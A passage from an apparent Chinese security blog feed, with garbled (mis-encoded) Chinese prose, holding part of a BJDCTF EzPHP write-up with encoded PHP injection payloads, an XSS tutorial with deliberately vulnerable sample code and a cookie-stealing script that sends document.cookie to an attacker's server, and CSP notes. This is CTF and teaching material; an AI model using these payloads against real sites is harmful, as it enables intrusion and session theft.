class="line">1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">POST:debu&#x3D;1&amp;passwd&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure><p>è¯»æºç ï¼š</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200210182446.png" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">POSTï¼š debu&#x3D;1&amp;passwd&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨çš„æ˜¯å–åç»•è¿‡ï¼Œè„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = 1 f l a g . p h p&quot;</span>;</span><br><span class="line">$arr1 = explode(<span class="string">&#x27; &#x27;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;~(&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr1 <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;)&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹éš¾é¡¶ï¼Œå‡ºé¢˜å¸ˆå‚…å¤ªå¼ºäº†ï¼Œè„‘ç“œå­å—¡å—¡çš„~</p><h4 id="éé¢„æœŸè§£define-fopen-fgets"><a href="#éé¢„æœŸè§£define-fopen-fgets" class="headerlink" title="éé¢„æœŸè§£define+fopen()+fgets()"></a>éé¢„æœŸè§£define+fopen()+fgets()</h4><p>æ²¡banæ‰<code>fopen()</code>ï¼Œå¯ä»¥<code>fgets()</code>è¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶æŒ‡é’ˆéœ€è¦ç§»åŠ¨å°±ä¸èƒ½è¯»å–å®Œæ•´æ–‡ä»¶ï¼Œ<code>$</code>è¢«ç¦æ— æ³•å®šä¹‰å˜é‡ï¼Œæœ€åæµ‹è¯•æ— æœåäº¤ç»™shanaå¸ˆå‚…ï¼Œè¢«shanaå¸ˆå‚…æ•´å‡ºæ¥äº†ï¼ˆttttqlï¼‰ï¼Œç”¨å¸¸é‡ï¼ŒPayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(aaa,fopen(~(%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%ce%<span class="number">99</span>%<span class="number">93</span>%cb%<span class="number">98</span>%d1%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f),r))ï¼›<span class="keyword">while</span>(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);</span><br></pre></td></tr></table></figure><h4 id="éé¢„æœŸè§£æ•°ç»„æ“ä½œ"><a href="#éé¢„æœŸè§£æ•°ç»„æ“ä½œ" class="headerlink" title="éé¢„æœŸè§£æ•°ç»„æ“ä½œ"></a>éé¢„æœŸè§£æ•°ç»„æ“ä½œ</h4><p>åŠ äº†ä¸ªå‚æ•°ï¼Œä¼ ä¸Šå»ä¼ªåè®®ï¼Œç„¶å<code>get_defined_vars()</code>æ•°ç»„è·å–åˆ°è¿™ä¸ªä¼ªåè®®æ”¾åˆ°<code>require()</code>é‡ŒåŒ…å«ï¼Œpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?deb%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;rce=%<span class="number">70</span>%<span class="number">68</span>%<span class="number">70</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>c%<span class="number">74</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">2</span>f%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">3</span>d%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">76</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">2</span>e%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">2</span>d%<span class="number">65</span>%<span class="number">6</span>e%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">2</span>f%<span class="number">72</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">6</span>f%<span class="number">75</span>%<span class="number">72</span>%<span class="number">63</span>%<span class="number">65</span>%<span class="number">3</span>d%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">31</span>%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">34</span>%<span class="number">67</span>%<span class="number">2</span>e%<span class="number">70</span>%<span class="number">68</span>%<span class="number">70</span>&amp;rce2=r&amp;sha%<span class="number">6</span>e%<span class="number">61</span>[]=a&amp;pa%<span class="number">73</span>sw%<span class="number">64</span>[]=b&amp;fla%<span class="number">67</span>[co%<span class="number">64</span>e]=create_function&amp;fla%<span class="number">67</span>[ar%<span class="number">67</span>]=;&#125;<span class="keyword">require</span>(get_defined_vars()[_GET][rce]);%<span class="number">0</span>a<span class="comment">//</span></span><br><span class="line">è§£ç åï¼š?debu=aqua_is_cute</span><br><span class="line">&amp;file=data:,debu_debu_aqua&amp;rce=php:<span class="comment">//filter/read=convert.base64-encode/resource=rea1fl4g.php&amp;rce2=r&amp;shana[]=a&amp;passwd[]=b&amp;flag[code]=create_function&amp;flag[arg]=;&#125;require(get_defined_vars()[_GET][rce]);</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.gem-love.com/websecurity/770.html">https://www.gem-love.com/websecurity/770.html</a></p><p><a href="http://www.gtfly.top/2020/01/30/BJDCTF2020-EzPHP.html">http://www.gtfly.top/2020/01/30/BJDCTF2020-EzPHP.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xssæ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼</title>
      <link href="2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†xssæ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼ï¼</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯xss"><a href="#ä»€ä¹ˆæ˜¯xss" class="headerlink" title="ä»€ä¹ˆæ˜¯xss?"></a>ä»€ä¹ˆæ˜¯xss?</h2><p>XSSæ˜¯è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting)ï¼Œå’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSã€‚æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p><h2 id="xssåˆ†ç±»"><a href="#xssåˆ†ç±»" class="headerlink" title="xssåˆ†ç±»"></a>xssåˆ†ç±»</h2><h3 id="åå°„å‹xss"><a href="#åå°„å‹xss" class="headerlink" title="åå°„å‹xss"></a>åå°„å‹xss</h3><p>åå°„å‹xssä¸€èˆ¬å‡ºç°åœ¨URLå‚æ•°ä¸­åŠç½‘ç«™æœç´¢æ ä¸­ï¼Œç”±äºéœ€è¦ç‚¹å‡»åŒ…å«æ¶æ„ä»£ç çš„URLæ‰å¯ä»¥è§¦å‘ï¼Œå¹¶ä¸”åªèƒ½è§¦å‘ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¹Ÿè¢«ç§°ä¸ºâ€œéæŒä¹…æ€§xssâ€</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; @$_GET[&#39;xss&#39;];</span><br><span class="line">if($xss!&#x3D;&#x3D;null)&#123;</span><br><span class="line">    echo $xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/TIMæˆªå›¾20200205202004.png" style="zoom:67%;"><p>æˆ‘ä»¬åœ¨è¾“å…¥æ¡†è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>å°±æˆåŠŸè§¦å‘äº†å¼¹æ¡†</p><p>åå°„å‹ XSS çš„æ•°æ®æµå‘æ˜¯ï¼š<code>æµè§ˆå™¨ -&gt; åç«¯ -&gt; æµè§ˆå™¨</code></p><h3 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h3><p>å­˜å‚¨å‹xssä¸€å‡ºç°åœ¨ç½‘ç«™ç•™è¨€æ¿ï¼Œè¯„è®ºå¤„ï¼Œä¸ªäººèµ„æ–™å¤„ç­‰éœ€è¦ç”¨æˆ·å¯ä»¥å¯¹ç½‘ç«™å†™å…¥æ•°æ®çš„åœ°æ–¹ã€‚æ”»å‡»è€…å†™å…¥ä¸€æ®µçªƒå–cookieçš„æ¶æ„JavaScriptä»£ç åˆ°è¯„è®ºå¤„ï¼Œè¿™æ®µæ¶æ„ä»£ç ä¼šå†™å…¥æ•°æ®åº“ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªå†™å…¥ä»£ç çš„é¡µé¢æ—¶ï¼Œç½‘ç«™ä»æ•°æ®åº“ä¸­è¯»å–æ¶æ„ä»£ç æ˜¾ç¤ºåˆ°ç½‘é¡µä¸­è¢«æµè§ˆå™¨æ‰§è¡Œï¼Œå¯¼è‡´ç”¨æˆ·cookieè¢«çªƒå–ï¼Œæ”»å‡»è€…æ— éœ€å—å®³è€…å¯†ç å³å¯ç™»å½•è´¦æˆ·ï¼Œæ‰€ä»¥ä¹Ÿè¢«ç§°ä½œâ€œæŒä¹…æ€§xssâ€ã€‚æŒä¹…æ€§xssæ¯”åå°„å‹xsså±å®³è¦å¤§çš„å¤š</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss&#x3D;@$_POST[&#39;xss&#39;];</span><br><span class="line">mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123&quot;);</span><br><span class="line">mysql_select_db(&quot;xss&quot;);</span><br><span class="line">if($xss!&#x3D;&#x3D;null)&#123;</span><br><span class="line">    $sql&#x3D;&quot;insert into temp(id,payload) values(&#39;1&#39;,&#39;$xss&#39;)&quot;;</span><br><span class="line">    $result&#x3D;mysql_query($sql);</span><br><span class="line">    echo $result;</span><br><span class="line">&#125;  ?&gt;</span><br></pre></td></tr></table></figure><p>ä¸ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œè€Œæ˜¯æ’å…¥åˆ°äº†æ•°æ®åº“ï¼Œå­˜å‚¨å‹ XSS çš„æ‰§è¡Œä½ç½®é€šå¸¸ä¸åŒäºè¾“å…¥ä½ç½®</p><p>å­˜å‚¨å‹ XSS çš„æ•°æ®æµå‘æ˜¯ï¼š<code>æµè§ˆå™¨-&gt; åç«¯-&gt; æ•°æ®åº“-&gt; åç«¯-&gt; æµè§ˆå™¨</code></p><h3 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h3><p>DOM xssæ˜¯åŸºäºdomæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼Œå‰ç«¯è„šæœ¬é€šè¿‡domåŠ¨æ€ä¿®æ”¹é¡µé¢ï¼Œç”±äºä¸ä¸æœåŠ¡ç«¯è¿›è¡Œäº¤äº’ï¼Œè€Œä¸”ä»£ç æ˜¯å¯è§çš„ï¼Œä»å‰ç«¯è·å–domä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œã€‚å¸¸è§çš„å¯ä»¥æ“çºµdomçš„å¯¹è±¡ï¼šURLï¼Œlocaltion,referrerç­‰</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); &#x2F;&#x2F;ç¦ç”¨é”™è¯¯æŠ¥å‘Š</span><br><span class="line">$name &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot; value&#x3D;&quot;&lt;?php echo $name;?&gt;&quot; &#x2F;&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;print&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">var text &#x3D; document.getElementById(&quot;text&quot;); </span><br><span class="line">var print &#x3D; document.getElementById(&quot;print&quot;);</span><br><span class="line">print.innerHTML &#x3D; text.value; &#x2F;&#x2F; è·å– textçš„å€¼ï¼Œå¹¶ä¸”è¾“å‡ºåœ¨printå†…ã€‚è¿™é‡Œæ˜¯å¯¼è‡´xssçš„ä¸»è¦åŸå› ã€‚</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><img src="/2020/01/27/xss%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/TIMæˆªå›¾20200205203708.png" style="zoom: 50%;"><p>DOMå‹XSSçš„æ•°æ®æµå‘æ˜¯ï¼š<code>URL--&gt;æµè§ˆå™¨</code></p><h2 id="xssæ¼æ´åˆ©ç”¨"><a href="#xssæ¼æ´åˆ©ç”¨" class="headerlink" title="xssæ¼æ´åˆ©ç”¨"></a>xssæ¼æ´åˆ©ç”¨</h2><h3 id="ç›—cookie"><a href="#ç›—cookie" class="headerlink" title="ç›—cookie"></a>ç›—cookie</h3><p>å¯ä»¥åœ¨è‡ªå·±vpsä¸Šç®€å•æ­ä¸€ä¸ªï¼Œ<code>index.php</code>å†™å…¥ä¸‹é¢å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;log.txt&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>].<span class="string">&quot;\n&quot;</span>,FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±ä¼šå°†è¯·æ±‚çš„å†…å®¹å†™å…¥<code>log.txt</code>é‡Œäº†ï¼Œå¯ä»¥æ„é€ ç±»ä¼¼ä¸‹é¢çš„payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://vps/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="xssç»•è¿‡payload"><a href="#xssç»•è¿‡payload" class="headerlink" title="xssç»•è¿‡payload"></a>xssç»•è¿‡payload</h2><p><a href="https://xz.aliyun.com/t/2936">https://xz.aliyun.com/t/2936</a></p><p><a href="https://blog.csdn.net/qq_29277155/article/details/51320064">https://blog.csdn.net/qq_29277155/article/details/51320064</a></p><p><a href="https://www.freebuf.com/articles/web/153055.html">https://www.freebuf.com/articles/web/153055.html</a></p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><h3 id="ä»€ä¹ˆæ˜¯CSP"><a href="#ä»€ä¹ˆæ˜¯CSP" class="headerlink" title="ä»€ä¹ˆæ˜¯CSP?"></a>ä»€ä¹ˆæ˜¯CSP?</h3><p>CSPçš„å…¨ç§°Content Security Policyï¼Œç”¨æ¥é˜²å¾¡XSSæ”»å‡»çš„æŠ€æœ¯ã€‚å®ƒæ˜¯ä¸€ç§ç”±å¼€å‘è€…å®šä¹‰çš„å®‰å…¨æ€§æ”¿ç­–æ€§ç”³æ˜ï¼Œé€šè¿‡CSPæŒ‡å®šå¯ä¿¡çš„å†…å®¹æ¥æºï¼Œè®©WEBå¤„äºä¸€ä¸ªå®‰å…¨çš„è¿è¡Œç¯å¢ƒä¸­ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªCSPå¤´ç”±å¤šç»„CSPç­–ç•¥ç»„æˆï¼Œä¸­é—´ç”±åˆ†å·åˆ†éš”ï¼Œå…¶ä¸­æ¯ä¸€ç»„ç­–ç•¥åŒ…å«ä¸€ä¸ªç­–ç•¥æŒ‡ä»¤å’Œä¸€ä¸ªå†…å®¹æºåˆ—è¡¨</p><p>ç­–ç•¥æŒ‡ä»¤æœ‰å¦‚ä¸‹é€‰é¡¹ï¼š</p><table><thead><tr><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>default-src</td><td>å®šä¹‰èµ„æºé»˜è®¤åŠ è½½ç­–ç•¥</td></tr><tr><td>connect-src</td><td>å®šä¹‰ Ajaxã€WebSocket ç­‰åŠ è½½ç­–ç•¥</td></tr><tr><td>font-src</td><td>å®šä¹‰ Font åŠ è½½ç­–ç•¥</td></tr><tr><td>frame-src</td><td>å®šä¹‰ Frame åŠ è½½ç­–ç•¥</td></tr><tr><td>img-src</td><td>å®šä¹‰å›¾ç‰‡åŠ è½½ç­–ç•¥</td></tr><tr><td>media-src</td><td>å®šä¹‰ &lt;audio&gt;ã€&lt;video&gt; ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td></tr><tr><td>object-src</td><td>å®šä¹‰ &lt;applet&gt;ã€&lt;embed&gt;ã€&lt;object&gt; ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td></tr><tr><td>script-src</td><td>å®šä¹‰ JS åŠ è½½ç­–ç•¥</td></tr><tr><td>style-src</td><td>å®šä¹‰ CSS åŠ è½½ç­–ç•¥</td></tr><tr><td>sandbox</td><td>å€¼ä¸º allow-formsï¼Œå¯¹èµ„æºå¯ç”¨ sandbox</td></tr><tr><td>report-uri</td><td>å€¼ä¸º /report-uriï¼Œæäº¤æ—¥å¿—</td></tr></tbody></table><p>å†…å®¹æºæœ‰å¦‚ä¸‹é€‰é¡¹ï¼š</p><table><thead><tr><th>æº</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>*</td><td>é€šé…ç¬¦ï¼Œå…è®¸ä»»ä½•URLï¼Œé™¤äº†data: blob: filesystem: schemes</td></tr><tr><td>*.foo.com</td><td>å…è®¸åŠ è½½foo.comå­åŸŸçš„èµ„æº</td></tr><tr><td>abc.foo.com</td><td>åªèƒ½åŠ è½½è¿™ä¸ªåŸŸåä¸‹çš„èµ„æº</td></tr><tr><td><a href="https://a.com/">https://a.com</a></td><td>åªèƒ½ç”¨HTTPSåŠ è½½åŸŸåä¸‹çš„èµ„æº</td></tr><tr><td>https:</td><td>é€šè¿‡HTTPSå¯ä»¥åŠ è½½ä»»æ„åŸŸåä¸‹çš„èµ„æº</td></tr><tr><td>â€˜noneâ€™</td><td>ä»£è¡¨ç©ºé›†,å³ä¸åŒ¹é…ä»»ä½•URL,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜selfâ€™</td><td>ä»£è¡¨å’Œæ–‡æ¡£åŒæº,åŒ…æ‹¬ç›¸åŒçš„URLåè®®å’Œç«¯å£å·,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜unsafe-inlineâ€™</td><td>å…è®¸ä½¿ç”¨å†…è”èµ„æº,å¦‚å†…è”çš„&lt;script&gt;å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„&lt;style&gt;å…ƒç´ ,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜unsafe-evalâ€™</td><td>å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>data:</td><td>å…è®¸data: URIä½œä¸ºå†…å®¹æ¥æº</td></tr><tr><td>mediastream:</td><td>å…è®¸mediastream: URIä½œä¸ºå†…å®¹æ¥æº</td></tr></tbody></table><p>å†…å®¹æºæœ‰ä¸‰ç§ï¼šæºåˆ—è¡¨ã€å…³é”®å­—å’Œæ•°æ®ï¼Œå…¶ä¸­<em>ï¼Œ</em>.foo.comï¼Œabc.foo.comï¼Œ<a href="https://a.com/">https://a.com</a> ï¼Œhttps:å±äºæºåˆ—è¡¨ã€‚â€™noneâ€™ï¼Œâ€™selfâ€™ï¼Œâ€™unsafe-inlineâ€™ï¼Œâ€™unsafe-evalâ€™å±äºå…³é”®å­—ã€‚data:ï¼Œmediastream:å±äºæ•°æ®</p><p>è¿™é‡Œæœ‰ä¸ªCSPæ˜¯å¦å®‰å…¨çš„æ£€æµ‹ç½‘ç«™ï¼š<a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com</a></p><h3 id="bypass-CSP"><a href="#bypass-CSP" class="headerlink" title="bypass CSP"></a>bypass CSP</h3><p><a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a></p><p><a href="https://xz.aliyun.com/t/5084">https://xz.aliyun.com/t/5084</a></p><p><a href="https://zhuanlan.zhihu.com/p/94246164?utm_source=com.tencent.tim&amp;utm_medium=social&amp;utm_oi=910631635467264000">https://zhuanlan.zhihu.com/p/94246164?utm_source=com.tencent.tim&amp;utm_medium=social&amp;utm_oi=910631635467264000</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2020æ¯”èµ›éƒ¨åˆ†writeup</title>
      <link href="2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/"/>
      <url>2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢è®°å½•äº†HGAMEä¸Šwebé¢˜ç›®å’Œmiscé¢˜ç›®çš„writeupï¼</p><a id="more"></a><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h4><p>æ‰“å¼€æç¤ºgithubï¼Œè¿˜ç€é‡æ ‡äº†ç‰ˆæœ¬ç®¡ç†å·¥å…·ï¼Œgitæºç æ³„éœ²ä¹Ÿæ²¡æ¢å¤å‡ºç¥é­”æœ‰ç”¨çš„ä¸œè¥¿</p><p>dirsearchæ‰«ä¸‹ç›®å½•ï¼Œå‘ç°å¥½å¤šå’Œgitç›¸å…³çš„æ–‡ä»¶å’Œç›®å½•</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200123173732.png" style="zoom:67%;"><p>åœ¨<code>/.git/config</code>ç›®å½•ä¸‹å‘ç°ç½‘ç«™çš„githubåœ°å€</p><p>ä¹Ÿå¯ä»¥ç”¨githack(æœ‰ä¸¤ä¸ª)ï¼š<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p><p>è€Œä¸æ˜¯è¿™ä¸ªï¼š<a 